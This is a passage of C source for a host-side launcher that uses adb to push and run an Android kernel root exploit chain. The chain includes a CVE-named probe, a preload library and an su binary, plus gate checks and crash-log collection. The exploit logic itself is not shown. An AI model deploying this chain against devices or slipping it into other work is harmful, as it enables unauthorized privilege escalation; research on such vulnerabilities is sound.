// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 yoyicue

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdbool.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <direct.h>
#include <io.h>
#include <process.h>
#ifndef PATH_MAX
#define PATH_MAX 32768
#endif
#ifndef O_CLOEXEC
#define O_CLOEXEC 0
#endif
#define open _open
#define close _close
#define read _read
#define write _write
#define getcwd _getcwd
#else
#include <libgen.h>
#include <poll.h>
#include <sys/wait.h>
#include <unistd.h>
extern char **environ;
#endif

#define REMOTE_DEVICE_RUNNER "/data/local/tmp/ionstack_reroot_device"
#define REMOTE_TARGET        "/data/local/tmp/ionstack_perf_target"
#define REMOTE_PRELOAD       "/data/local/tmp/ionstack_preload.so"
#define REMOTE_PROBE         "/data/local/tmp/cve43499_chainwalk_probe_arm32"
#define REMOTE_SU            "/data/local/tmp/su"

struct options {
  const char *serial;
  const char *repo_root;
  const char *result_dir;
  const char *device_runner;
  const char *target;
  const char *preload;
  const char *probe;
  int force;
  int no_deploy;
  int preflight_only;
  int validate_only;
  int observe_only;
  int legacy_route;
  int t878u_pselect_route;
  int allow_weak_holder;
};

struct gate_state {
  int abi_gate;
  int overlap_gate;
  int identity_gate;
  int consumer_gate;
  int write_gate;
};

struct run_result {
  int exit_code;
  int timed_out;
  char *output;
  size_t output_len;
};

static volatile sig_atomic_t interrupted;
#ifdef _WIN32
static HANDLE active_job;
#else
static volatile sig_atomic_t active_child = -1;
#endif

static void on_signal(int signo) {
  interrupted = signo;
#ifdef _WIN32
  if (active_job) {
    TerminateJobObject(active_job, 128U + (UINT)signo);
  }
#else
  pid_t child = (pid_t)active_child;
  if (child > 0) {
    kill(-child, signo);
  }
#endif
}

static uint64_t monotonic_ms(void) {
#ifdef _WIN32
  return (uint64_t)GetTickCount64();
#else
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000U + (uint64_t)ts.tv_nsec / 1000000U;
#endif
}

static int env_gate_override(const char *name, int fallback) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }
  if (strcmp(value, "0") == 0) {
    return 0;
  }
  if (strcmp(value, "1") == 0) {
    return 1;
  }
  return fallback;
}

static int append_text(char **buffer, size_t *used, size_t *capacity,
                       const char *text) {
  size_t needed = strlen(text);
  if (*used + needed + 1 > *capacity) {
    size_t new_capacity = *capacity ? *capacity : 256;
    while (*used + needed + 1 > new_capacity) {
      new_capacity *= 2;
    }
    char *grown = realloc(*buffer, new_capacity);
    if (!grown) {
      return -1;
    }
    *buffer = grown;
    *capacity = new_capacity;
  }
  memcpy(*buffer + *used, text, needed);
  *used += needed;
  (*buffer)[*used] = '\0';
  return 0;
}

static int append_shell_quoted(char **buffer, size_t *used, size_t *capacity,
                               const char *text) {
  if (append_text(buffer, used, capacity, "'") != 0) {
    return -1;
  }
  for (const char *cursor = text; *cursor; ++cursor) {
    if (*cursor == '\'') {
      if (append_text(buffer, used, capacity, "'\\''") != 0) {
        return -1;
      }
    } else {
      char ch[2] = {*cursor, '\0'};
      if (append_text(buffer, used, capacity, ch) != 0) {
        return -1;
      }
    }
  }
  return append_text(buffer, used, capacity, "'");
}

static int append_shell_word(char **buffer, size_t *used, size_t *capacity,
                             const char *text) {
  return append_shell_quoted(buffer, used, capacity, text);
}

static int shell_command_append_ionstack_env(char **buffer, size_t *used,
                                             size_t *capacity,
                                             size_t *count_out) {
#ifdef _WIN32
  (void)buffer;
  (void)used;
  (void)capacity;
  if (count_out) {
    *count_out = 0;
  }
  return 0;
#else
  size_t count = 0;
  for (char **entry = environ; entry && *entry; ++entry) {
    if (strncmp(*entry, "IONSTACK_", 9) != 0) {
      continue;
    }
    const char *equals = strchr(*entry, '=');
    if (!equals || equals == *entry) {
      continue;
    }
    size_t name_len = (size_t)(equals - *entry);
    char name[128];
    if (name_len == 0 || name_len >= sizeof(name)) {
      continue;
    }
    memcpy(name, *entry, name_len);
    name[name_len] = '\0';
    if (append_text(buffer, used, capacity, name) != 0 ||
        append_text(buffer, used, capacity, "=") != 0 ||
        append_shell_word(buffer, used, capacity, equals + 1) != 0 ||
        append_text(buffer, used, capacity, " ") != 0) {
      return -1;
    }
    count++;
  }
  if (count_out) {
    *count_out = count;
  }
  return 0;
#endif
}

static void finalize_gate_state(struct gate_state *gates) {
  gates->write_gate = gates->abi_gate && gates->overlap_gate &&
                      gates->identity_gate && gates->consumer_gate;
}

#ifdef _WIN32
static int write_all(int fd, const void *data, size_t length);

static int dprintf(int fd, const char *format, ...) {
  va_list ap;
  va_start(ap, format);
  va_list measure;
  va_copy(measure, ap);
  int length = vsnprintf(NULL, 0, format, measure);
  va_end(measure);
  if (length < 0) {
    va_end(ap);
    return -1;
  }
  char *buffer = malloc((size_t)length + 1U);
  if (!buffer) {
    va_end(ap);
    return -1;
  }
  vsnprintf(buffer, (size_t)length + 1U, format, ap);
  va_end(ap);
  int result = write_all(fd, buffer, (size_t)length) == 0 ? length : -1;
  free(buffer);
  return result;
}

static int make_directory(const char *path, mode_t mode) {
  (void)mode;
  return _mkdir(path);
}
#else
static int make_directory(const char *path, mode_t mode) {
  return mkdir(path, mode);
}
#endif

static int mkdir_p(const char *path, mode_t mode) {
  char copy[PATH_MAX];
  if (strlen(path) >= sizeof(copy)) {
    errno = ENAMETOOLONG;
    return -1;
  }
  strcpy(copy, path);
  size_t len = strlen(copy);
  while (len > 1 && copy[len - 1] == '/') {
    copy[--len] = '\0';
  }
  for (char *p = copy + 1; *p; ++p) {
    if (*p != '/' && *p != '\\') {
      continue;
    }
    if (p == copy + 2 && copy[1] == ':') {
      continue;
    }
    char separator = *p;
    *p = '\0';
    if (make_directory(copy, mode) != 0 && errno != EEXIST) {
      return -1;
    }
    *p = separator;
  }
  if (make_directory(copy, mode) != 0 && errno != EEXIST) {
    return -1;
  }
  return 0;
}

static int append_bytes(char **buffer, size_t *used, size_t *capacity,
                        const void *data, size_t length) {
  if (!buffer) {
    return 0;
  }
  if (*used + length + 1 > *capacity) {
    size_t next = *capacity ? *capacity : 4096;
    while (next < *used + length + 1) {
      if (next > SIZE_MAX / 2) {
        errno = ENOMEM;
        return -1;
      }
      next *= 2;
    }
    char *grown = realloc(*buffer, next);
    if (!grown) {
      return -1;
    }
    *buffer = grown;
    *capacity = next;
  }
  memcpy(*buffer + *used, data, length);
  *used += length;
  (*buffer)[*used] = '\0';
  return 0;
}

static int write_all(int fd, const void *data, size_t length) {
  const unsigned char *cursor = data;
  while (length > 0) {
    ssize_t wrote = write(fd, cursor, length);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      return -1;
    }
    cursor += wrote;
    length -= (size_t)wrote;
  }
  return 0;
}

#ifdef _WIN32
static int append_command_arg(char *command, size_t capacity, size_t *used,
                              const char *arg) {
  int quote = !*arg || strpbrk(arg, " \t\"") != NULL;
  size_t needed = (*used ? 1U : 0U) + (quote ? 2U : 0U) + strlen(arg) * 2U + 1U;
  if (*used + needed > capacity) {
    errno = E2BIG;
    return -1;
  }
  if (*used) {
    command[(*used)++] = ' ';
  }
  if (quote) {
    command[(*used)++] = '"';
  }
  size_t slashes = 0;
  for (const char *p = arg;; ++p) {
    if (*p == '\\') {
      slashes++;
      continue;
    }
    if (*p == '"') {
      for (size_t i = 0; i < slashes * 2U + 1U; ++i) {
        command[(*used)++] = '\\';
      }
      command[(*used)++] = '"';
    } else {
      if (!*p && quote) {
        slashes *= 2U;
      }
      for (size_t i = 0; i < slashes; ++i) {
        command[(*used)++] = '\\';
      }
      if (!*p) {
        break;
      }
      command[(*used)++] = *p;
    }
    slashes = 0;
  }
  if (quote) {
    command[(*used)++] = '"';
  }
  command[*used] = '\0';
  return 0;
}

static struct run_result run_process(char *const argv[], int log_fd,
                                     unsigned timeout_ms, int echo) {
  struct run_result result;
  memset(&result, 0, sizeof(result));
  result.exit_code = -1;

  char command[32768];
  size_t command_len = 0;
  command[0] = '\0';
  for (size_t i = 0; argv[i]; ++i) {
    if (append_command_arg(command, sizeof(command), &command_len,
                           argv[i]) != 0) {
      return result;
    }
  }

  SECURITY_ATTRIBUTES security = {
      .nLength = sizeof(security), .lpSecurityDescriptor = NULL,
      .bInheritHandle = TRUE};
  HANDLE pipe_read = NULL;
  HANDLE pipe_write = NULL;
  if (!CreatePipe(&pipe_read, &pipe_write, &security, 0)) {
    return result;
  }
  SetHandleInformation(pipe_read, HANDLE_FLAG_INHERIT, 0);

  STARTUPINFOA startup;
  PROCESS_INFORMATION process;
  memset(&startup, 0, sizeof(startup));
  memset(&process, 0, sizeof(process));
  startup.cb = sizeof(startup);
  startup.dwFlags = STARTF_USESTDHANDLES;
  startup.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
  startup.hStdOutput = pipe_write;
  startup.hStdError = pipe_write;

  HANDLE job = CreateJobObjectA(NULL, NULL);
  if (job) {
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION limits;
    memset(&limits, 0, sizeof(limits));
    limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(job, JobObjectExtendedLimitInformation, &limits,
                            sizeof(limits));
  }
  BOOL created = CreateProcessA(NULL, command, NULL, NULL, TRUE,
                                CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                                NULL, NULL, &startup, &process);
  CloseHandle(pipe_write);
  pipe_write = NULL;
  if (!created) {
    CloseHandle(pipe_read);
    if (job) {
      CloseHandle(job);
    }
    return result;
  }
  if (job) {
    AssignProcessToJobObject(job, process.hProcess);
  }
  active_job = job;

  char *output = NULL;
  size_t output_len = 0;
  size_t output_capacity = 0;
  uint64_t deadline = monotonic_ms() + timeout_ms;
  int exited = 0;
  for (;;) {
    DWORD available = 0;
    while (PeekNamedPipe(pipe_read, NULL, 0, NULL, &available, NULL) &&
           available > 0) {
      char chunk[8192];
      DWORD want = available < sizeof(chunk) ? available : sizeof(chunk);
      DWORD got = 0;
      if (!ReadFile(pipe_read, chunk, want, &got, NULL) || got == 0) {
        break;
      }
      if (echo) {
        write_all(STDOUT_FILENO, chunk, (size_t)got);
      }
      if (log_fd >= 0) {
        write_all(log_fd, chunk, (size_t)got);
      }
      append_bytes(&output, &output_len, &output_capacity, chunk,
                   (size_t)got);
      available -= got;
    }
    DWORD wait = WaitForSingleObject(process.hProcess, 20);
    if (wait == WAIT_OBJECT_0) {
      exited = 1;
      if (!PeekNamedPipe(pipe_read, NULL, 0, NULL, &available, NULL) ||
          available == 0) {
        break;
      }
    }
    if (interrupted ||
        (timeout_ms > 0 && monotonic_ms() >= deadline)) {
      result.timed_out = !interrupted;
      if (job) {
        TerminateJobObject(job, interrupted ? 128U + interrupted : 124U);
      } else {
        TerminateProcess(process.hProcess,
                         interrupted ? 128U + interrupted : 124U);
      }
      WaitForSingleObject(process.hProcess, 3000);
      exited = 1;
    }
    if (exited && WaitForSingleObject(process.hProcess, 0) == WAIT_OBJECT_0) {
      continue;
    }
  }

  DWORD exit_code = 255;
  GetExitCodeProcess(process.hProcess, &exit_code);
  result.exit_code = (int)exit_code;
  result.output = output ? output : calloc(1, 1);
  result.output_len = output_len;
  active_job = NULL;
  CloseHandle(pipe_read);
  CloseHandle(process.hThread);
  CloseHandle(process.hProcess);
  if (job) {
    CloseHandle(job);
  }
  return result;
}
#else
static struct run_result run_process(char *const argv[], int log_fd,
                                     unsigned timeout_ms, int echo) {
  struct run_result result;
  memset(&result, 0, sizeof(result));
  result.exit_code = -1;

  int pipe_fds[2];
  if (pipe(pipe_fds) != 0) {
    return result;
  }
  pid_t pid = fork();
  if (pid < 0) {
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    return result;
  }
  if (pid == 0) {
    setpgid(0, 0);
    dup2(pipe_fds[1], STDOUT_FILENO);
    dup2(pipe_fds[1], STDERR_FILENO);
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    execvp(argv[0], argv);
    dprintf(STDERR_FILENO, "exec %s failed: %s\n", argv[0], strerror(errno));
    _exit(127);
  }
  close(pipe_fds[1]);
  setpgid(pid, pid);
  active_child = pid;
  int flags = fcntl(pipe_fds[0], F_GETFL, 0);
  if (flags >= 0) {
    fcntl(pipe_fds[0], F_SETFL, flags | O_NONBLOCK);
  }

  char *output = NULL;
  size_t output_len = 0;
  size_t output_capacity = 0;
  uint64_t deadline = monotonic_ms() + timeout_ms;
  int exited = 0;
  int status = 0;
  int eof = 0;
  while (!interrupted && (!exited || !eof)) {
    uint64_t now = monotonic_ms();
    if (timeout_ms > 0 && now >= deadline) {
      result.timed_out = 1;
      kill(-pid, SIGTERM);
      break;
    }
    struct pollfd pfd = {.fd = pipe_fds[0], .events = POLLIN | POLLHUP};
    poll(&pfd, 1, 200);
    for (;;) {
      char chunk[8192];
      ssize_t got = read(pipe_fds[0], chunk, sizeof(chunk));
      if (got > 0) {
        if (echo) {
          write_all(STDOUT_FILENO, chunk, (size_t)got);
        }
        if (log_fd >= 0) {
          write_all(log_fd, chunk, (size_t)got);
        }
        append_bytes(&output, &output_len, &output_capacity, chunk,
                     (size_t)got);
        continue;
      }
      if (got == 0) {
        eof = 1;
      }
      break;
    }
    if (!exited) {
      pid_t got = waitpid(pid, &status, WNOHANG);
      if (got == pid) {
        exited = 1;
      }
    }
  }

  if (!exited) {
    uint64_t grace = monotonic_ms() + 3000U;
    while (monotonic_ms() < grace) {
      pid_t got = waitpid(pid, &status, WNOHANG);
      if (got == pid) {
        exited = 1;
        break;
      }
      usleep(25000);
    }
    if (!exited) {
      kill(-pid, SIGKILL);
      while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
      }
      exited = 1;
    }
  }
  for (;;) {
    char chunk[8192];
    ssize_t got = read(pipe_fds[0], chunk, sizeof(chunk));
    if (got <= 0) {
      break;
    }
    if (echo) {
      write_all(STDOUT_FILENO, chunk, (size_t)got);
    }
    if (log_fd >= 0) {
      write_all(log_fd, chunk, (size_t)got);
    }
    append_bytes(&output, &output_len, &output_capacity, chunk, (size_t)got);
  }
  close(pipe_fds[0]);
  active_child = -1;

  if (WIFEXITED(status)) {
    result.exit_code = WEXITSTATUS(status);
  } else if (WIFSIGNALED(status)) {
    result.exit_code = 128 + WTERMSIG(status);
  } else {
    result.exit_code = 255;
  }
  if (!output) {
    output = calloc(1, 1);
  }
  result.output = output;
  result.output_len = output_len;
  return result;
}
#endif

static void free_run_result(struct run_result *result) {
  free(result->output);
  result->output = NULL;
  result->output_len = 0;
}

static struct run_result run_adb(const struct options *options, int log_fd,
                                 unsigned timeout_ms, int echo,
                                 const char *first, ...) {
  char *argv[32];
  size_t used = 0;
  argv[used++] = "adb";
  if (options->serial && *options->serial) {
    argv[used++] = "-s";
    argv[used++] = (char *)options->serial;
  }
  va_list ap;
  va_start(ap, first);
  const char *item = first;
  while (item && used + 1 < sizeof(argv) / sizeof(argv[0])) {
    argv[used++] = (char *)item;
    item = va_arg(ap, const char *);
  }
  va_end(ap);
  argv[used] = NULL;
  return run_process(argv, log_fd, timeout_ms, echo);
}

static struct run_result run_shell_command(const struct options *options,
                                           int log_fd, unsigned timeout_ms,
                                           int echo,
                                           const char *command) {
  char *argv[8];
  size_t used = 0;
  argv[used++] = "adb";
  if (options->serial && *options->serial) {
    argv[used++] = "-s";
    argv[used++] = (char *)options->serial;
  }
  argv[used++] = "shell";
  argv[used++] = (char *)command;
  argv[used] = NULL;
  return run_process(argv, log_fd, timeout_ms, echo);
}

static struct run_result run_device_runner(const struct options *options,
                                           int log_fd,
                                           const struct gate_state *gates) {
  char gate_abi_arg[32];
  char gate_overlap_arg[32];
  char gate_identity_arg[32];
  char gate_consumer_arg[32];
  const char *device_args[16];
  size_t device_argc = 0;
  int gate_abi = env_gate_override("IONSTACK_GATE_ABI", gates->abi_gate);
  int gate_overlap =
      env_gate_override("IONSTACK_GATE_OVERLAP", gates->overlap_gate);
  int gate_identity =
      env_gate_override("IONSTACK_GATE_IDENTITY", gates->identity_gate);
  int gate_consumer =
      env_gate_override("IONSTACK_GATE_CONSUMER", gates->consumer_gate);
  char *command = NULL;
  size_t used = 0;
  size_t capacity = 0;
  size_t forwarded_env = 0;

  snprintf(gate_abi_arg, sizeof(gate_abi_arg), "--gate-abi=%d", gate_abi);
  snprintf(gate_overlap_arg, sizeof(gate_overlap_arg), "--gate-overlap=%d",
           gate_overlap);
  snprintf(gate_identity_arg, sizeof(gate_identity_arg), "--gate-identity=%d",
           gate_identity);
  snprintf(gate_consumer_arg, sizeof(gate_consumer_arg), "--gate-consumer=%d",
           gate_consumer);

  if (options->force) {
    device_args[device_argc++] = "--force";
  }
  if (options->preflight_only) {
    device_args[device_argc++] = "--preflight-only";
  } else if (options->validate_only) {
    device_args[device_argc++] = "--validate-only";
  } else {
    if (options->observe_only) {
      device_args[device_argc++] = "--observe-only";
    }
    if (options->legacy_route) {
      device_args[device_argc++] = "--legacy-route";
    } else if (options->t878u_pselect_route) {
      device_args[device_argc++] = "--t878u-pselect-route";
    }
    if (options->allow_weak_holder) {
      device_args[device_argc++] = "--allow-weak-holder";
    }
  }
  device_args[device_argc++] = gate_abi_arg;
  device_args[device_argc++] = gate_overlap_arg;
  device_args[device_argc++] = gate_identity_arg;
  device_args[device_argc++] = gate_consumer_arg;

  if (shell_command_append_ionstack_env(&command, &used, &capacity,
                                        &forwarded_env) != 0 ||
      append_text(&command, &used, &capacity, "exec ") != 0 ||
      append_shell_word(&command, &used, &capacity, REMOTE_DEVICE_RUNNER) != 0) {
    free(command);
    struct run_result oom = {.exit_code = 255, .timed_out = 0};
    return oom;
  }
  for (size_t i = 0; i < device_argc; ++i) {
    if (append_text(&command, &used, &capacity, " ") != 0 ||
        append_shell_word(&command, &used, &capacity, device_args[i]) != 0) {
      free(command);
      struct run_result oom = {.exit_code = 255, .timed_out = 0};
      return oom;
    }
  }

  printf("[host] device_runner forward_ionstack_env=%zu\n", forwarded_env);
  dprintf(log_fd, "[host] device_runner forward_ionstack_env=%zu\n",
          forwarded_env);

  struct run_result result =
      run_shell_command(options, log_fd,
                        options->preflight_only ? 120000U : 1200000U, 1,
                        command);
  free(command);
  return result;
}

static int path_exists(const char *path) {
  struct stat st;
  return stat(path, &st) == 0;
}

static void log_path_status(int log_fd, const char *label, const char *path) {
  int exists = path_exists(path);
  printf("[host] %s exists=%d path=%s\n", label, exists, path);
  dprintf(log_fd, "[host] %s exists=%d path=%s\n", label, exists, path);
}

static void log_gate_state_host(int log_fd, const struct options *options,
                                const struct gate_state *gates) {
  const char *route = options->observe_only
                          ? "observe-only"
                          : (options->t878u_pselect_route ? "t878u-pselect-root"
                                                          : "legacy-capture-probe");
  printf("[host] GATES route=%s observe=%d abi_gate=%d overlap_gate=%d "
         "identity_gate=%d consumer_gate=%d write_gate=%d\n",
         route, options->observe_only, gates->abi_gate, gates->overlap_gate,
         gates->identity_gate, gates->consumer_gate, gates->write_gate);
  dprintf(log_fd,
          "[host] GATES route=%s observe=%d abi_gate=%d overlap_gate=%d "
          "identity_gate=%d consumer_gate=%d write_gate=%d\n",
          route, options->observe_only, gates->abi_gate, gates->overlap_gate,
          gates->identity_gate, gates->consumer_gate, gates->write_gate);
}

static void log_blocked_gates_host(int log_fd, const struct gate_state *gates) {
  if (!gates->abi_gate) {
    printf("[host] blocked_abi reason=missing_matched_vmlinux_or_debug_info\n");
    dprintf(log_fd,
            "[host] blocked_abi reason=missing_matched_vmlinux_or_debug_info\n");
  }
  if (!gates->overlap_gate) {
    printf("[host] blocked_overlap reason=no_verified_waiter_iocb_overlap\n");
    dprintf(log_fd,
            "[host] blocked_overlap reason=no_verified_waiter_iocb_overlap\n");
  }
  if (!gates->identity_gate) {
    printf("[host] blocked_identity reason=no_direct_map_identity_proof\n");
    dprintf(log_fd,
            "[host] blocked_identity reason=no_direct_map_identity_proof\n");
  }
  if (!gates->consumer_gate) {
    printf("[host] blocked_consumer reason=no_verified_consumer_trace\n");
    dprintf(log_fd,
            "[host] blocked_consumer reason=no_verified_consumer_trace\n");
  }
}

static void log_no_go_host(int log_fd, const struct options *options,
                           const struct gate_state *gates,
                           const char *phase) {
  const char *route = options->observe_only
                          ? "observe-only"
                          : (options->t878u_pselect_route ? "t878u-pselect-root"
                                                          : "legacy-capture-probe");
  log_blocked_gates_host(log_fd, gates);
  printf("[host] no_go route=%s phase=%s abi_gate=%d overlap_gate=%d "
         "identity_gate=%d consumer_gate=%d write_gate=%d\n",
         route, phase, gates->abi_gate, gates->overlap_gate,
         gates->identity_gate, gates->consumer_gate, gates->write_gate);
  dprintf(log_fd,
          "[host] no_go route=%s phase=%s abi_gate=%d overlap_gate=%d "
          "identity_gate=%d consumer_gate=%d write_gate=%d\n",
          route, phase, gates->abi_gate, gates->overlap_gate,
          gates->identity_gate, gates->consumer_gate, gates->write_gate);
}

static int wait_for_device_ready(const struct options *options, int log_fd,
                                 unsigned timeout_ms) {
  struct run_result wait =
      run_adb(options, log_fd, timeout_ms, 0, "wait-for-device", NULL);
  int ok = wait.exit_code == 0 && !wait.timed_out;
  free_run_result(&wait);
  return ok;
}

static struct run_result capture_pstore_snapshot(const struct options *options,
                                                 int log_fd,
                                                 const char *phase) {
  printf("[host] pstore_snapshot phase=%s\n", phase);
  dprintf(log_fd, "[host] pstore_snapshot phase=%s\n", phase);
  return run_shell_command(
      options, log_fd, 20000, 1,
      "if [ ! -d /sys/fs/pstore ]; then "
      "echo PSTORE_MISSING; "
      "else "
      "if ls -1 /sys/fs/pstore/* >/dev/null 2>&1; then "
      "echo PSTORE_PRESENT; "
      "ls -1 /sys/fs/pstore 2>/dev/null; "
      "for f in /sys/fs/pstore/*; do "
      "if [ -f \"$f\" ]; then echo \"--- $f ---\"; cat \"$f\"; fi; "
      "done; "
      "else "
      "echo PSTORE_EMPTY; "
      "fi; "
      "fi");
}

static struct run_result capture_boot_context_snapshot(
    const struct options *options, int log_fd, const char *phase) {
  printf("[host] boot_context phase=%s\n", phase);
  dprintf(log_fd, "[host] boot_context phase=%s\n", phase);
  return run_shell_command(
      options, log_fd, 30000, 1,
      "echo BOOT_CONTEXT_BEGIN; "
      "echo boot_id=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null); "
      "echo uptime=$(cat /proc/uptime 2>/dev/null); "
      "echo ro.boot.bootreason=$(getprop ro.boot.bootreason); "
      "echo sys.boot.reason=$(getprop sys.boot.reason); "
      "echo ro.boot.boot_recovery=$(getprop ro.boot.boot_recovery); "
      "echo ro.boot.warranty_bit=$(getprop ro.boot.warranty_bit); "
      "echo init.svc.bootanim=$(getprop init.svc.bootanim); "
      "echo service.bootanim.exit=$(getprop service.bootanim.exit); "
      "echo '=== /sys/fs/pstore ==='; "
      "ls -lt /sys/fs/pstore 2>/dev/null || true; "
      "echo '=== /data/tombstones ==='; "
      "ls -lt /data/tombstones 2>/dev/null | head -n 20 || true; "
      "echo '=== /data/system/dropbox ==='; "
      "ls -lt /data/system/dropbox 2>/dev/null | head -n 20 || true; "
      "echo '=== logcat boot markers ==='; "
      "logcat -b all -d -v threadtime 2>/dev/null | "
      "grep -Ei 'boot|reboot|shutdown|watchdog|panic|fatal|tombstone|pstore|last_kmsg' | "
      "tail -n 200 || true; "
      "echo BOOT_CONTEXT_END");
}

static int pstore_has_entries(const struct run_result *result) {
  return result->output && strstr(result->output, "PSTORE_PRESENT");
}

static int file_is_regular(const char *path) {
  struct stat st;
  return stat(path, &st) == 0 && S_ISREG(st.st_mode);
}

static int join_path(char *output, size_t size, const char *root,
                     const char *relative) {
  int wrote = snprintf(output, size, "%s/%s", root, relative);
  return wrote >= 0 && (size_t)wrote < size ? 0 : -1;
}

static char *resolve_path(const char *input, char *output, size_t size) {
#ifdef _WIN32
  DWORD length = GetFullPathNameA(input, (DWORD)size, output, NULL);
  if (length == 0 || length >= size) {
    errno = ENAMETOOLONG;
    return NULL;
  }
  return output;
#else
  (void)size;
  return realpath(input, output);
#endif
}

static int derive_repo_root(const char *argv0, char *output, size_t size) {
  char executable[PATH_MAX];
#ifdef _WIN32
  (void)argv0;
  DWORD length = GetModuleFileNameA(NULL, executable, sizeof(executable));
  if (length == 0 || length >= sizeof(executable)) {
    return -1;
  }
#else
  if (!realpath(argv0, executable)) {
    return -1;
  }
#endif
  char *slash = strrchr(executable, '\\');
  char *forward = strrchr(executable, '/');
  if (!slash || (forward && forward > slash)) {
    slash = forward;
  }
  if (!slash) {
    return -1;
  }
  *slash = '\0';

  char packaged_artifact[PATH_MAX];
  if (join_path(packaged_artifact, sizeof(packaged_artifact), executable,
                "build/ionstack_reroot_device") == 0 &&
      file_is_regular(packaged_artifact)) {
    return resolve_path(executable, output, size) ? 0 : -1;
  }

  char candidate[PATH_MAX];
  if (snprintf(candidate, sizeof(candidate), "%s/..", executable) >=
      (int)sizeof(candidate)) {
    return -1;
  }
  return resolve_path(candidate, output, size) ? 0 : -1;
}

static void make_default_result_dir(char *output, size_t size) {
  time_t now = time(NULL);
  struct tm local;
#ifdef _WIN32
  localtime_s(&local, &now);
#else
  localtime_r(&now, &local);
#endif
  strftime(output, size,
           "results/%Y-%m-%d/reroot_%Y%m%d_%H%M%S", &local);
}

static void usage(const char *program) {
  fprintf(stderr,
          "usage: %s [-s SERIAL] [--repo-root=DIR] [--result-dir=DIR] "
          "[--force] [--preflight-only|--validate-only|--observe-only] "
          "[--legacy-route [--allow-weak-holder] | "
          "--t878u-pselect-route] [--no-deploy]\n"
          "       optional artifact overrides: --device-runner=FILE "
          "--target=FILE --preload=FILE --probe=FILE\n",
          program);
}

static int parse_options(int argc, char **argv, struct options *options) {
  memset(options, 0, sizeof(*options));
  options->serial = getenv("ANDROID_SERIAL");
  for (int i = 1; i < argc; ++i) {
    if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
      options->serial = argv[++i];
    } else if (strncmp(argv[i], "--serial=", 9) == 0) {
      options->serial = argv[i] + 9;
    } else if (strncmp(argv[i], "--repo-root=", 12) == 0) {
      options->repo_root = argv[i] + 12;
    } else if (strncmp(argv[i], "--result-dir=", 13) == 0) {
      options->result_dir = argv[i] + 13;
    } else if (strncmp(argv[i], "--device-runner=", 16) == 0) {
      options->device_runner = argv[i] + 16;
    } else if (strncmp(argv[i], "--target=", 9) == 0) {
      options->target = argv[i] + 9;
    } else if (strncmp(argv[i], "--preload=", 10) == 0) {
      options->preload = argv[i] + 10;
    } else if (strncmp(argv[i], "--probe=", 8) == 0) {
      options->probe = argv[i] + 8;
    } else if (strcmp(argv[i], "--force") == 0) {
      options->force = 1;
    } else if (strcmp(argv[i], "--no-deploy") == 0) {
      options->no_deploy = 1;
    } else if (strcmp(argv[i], "--preflight-only") == 0) {
      options->preflight_only = 1;
    } else if (strcmp(argv[i], "--validate-only") == 0) {
      options->validate_only = 1;
    } else if (strcmp(argv[i], "--observe-only") == 0) {
      options->observe_only = 1;
    } else if (strcmp(argv[i], "--legacy-route") == 0) {
      options->legacy_route = 1;
    } else if (strcmp(argv[i], "--t878u-pselect-route") == 0) {
      options->t878u_pselect_route = 1;
    } else if (strcmp(argv[i], "--allow-weak-holder") == 0) {
      options->allow_weak_holder = 1;
    } else if (strcmp(argv[i], "--help") == 0) {
      usage(argv[0]);
      exit(0);
    } else {
      fprintf(stderr, "unknown argument: %s\n", argv[i]);
      return -1;
    }
  }
  if (options->preflight_only && options->validate_only) {
    fprintf(stderr, "--preflight-only and --validate-only are mutually exclusive\n");
    return -1;
  }
  if (options->observe_only &&
      (options->preflight_only || options->validate_only)) {
    fprintf(stderr,
            "--observe-only cannot be combined with diagnostic-only modes\n");
    return -1;
  }
  if (options->force && (options->preflight_only || options->validate_only)) {
    fprintf(stderr, "--force cannot be combined with diagnostic-only modes\n");
    return -1;
  }
  if ((options->preflight_only || options->validate_only) &&
      (options->legacy_route || options->t878u_pselect_route)) {
    fprintf(stderr,
            "route overrides cannot be combined with diagnostic-only modes\n");
    return -1;
  }
  if (options->legacy_route && options->t878u_pselect_route) {
    fprintf(stderr,
            "--legacy-route and --t878u-pselect-route are mutually exclusive\n");
    return -1;
  }
  if (!options->preflight_only && !options->validate_only &&
      !options->legacy_route && !options->t878u_pselect_route) {
    options->legacy_route = 1;
  }
  if (options->observe_only && !options->legacy_route) {
    fprintf(stderr,
            "--observe-only currently supports only the legacy route\n");
    return -1;
  }
  if (options->allow_weak_holder &&
      (!options->legacy_route || (!options->observe_only && !options->force))) {
    fprintf(stderr,
            "--allow-weak-holder requires --legacy-route with either "
            "--observe-only or --force\n");
    return -1;
  }
  return 0;
}

static int remote_root_check(const struct options *options, int log_fd,
                             char **output_out) {
  struct run_result check =
      run_adb(options, log_fd, 10000, 0, "shell", REMOTE_SU, "-c", "id",
              NULL);
  int ok = check.exit_code == 0 && check.output &&
           strstr(check.output, "uid=0(root)");
  if (output_out) {
    *output_out = check.output;
    check.output = NULL;
  }
  free_run_result(&check);
  return ok;
}

static int push_artifact(const struct options *options, int log_fd,
                         const char *local, const char *remote) {
  printf("[host] push %s -> %s\n", local, remote);
  dprintf(log_fd, "[host] push %s -> %s\n", local, remote);
  struct run_result push =
      run_adb(options, log_fd, 120000, 1, "push", local, remote, NULL);
  int ok = push.exit_code == 0 && !push.timed_out;
  free_run_result(&push);
  return ok ? 0 : -1;
}

int main(int argc, char **argv) {
  struct options options;
  if (parse_options(argc, argv, &options) != 0) {
    usage(argv[0]);
    return 2;
  }
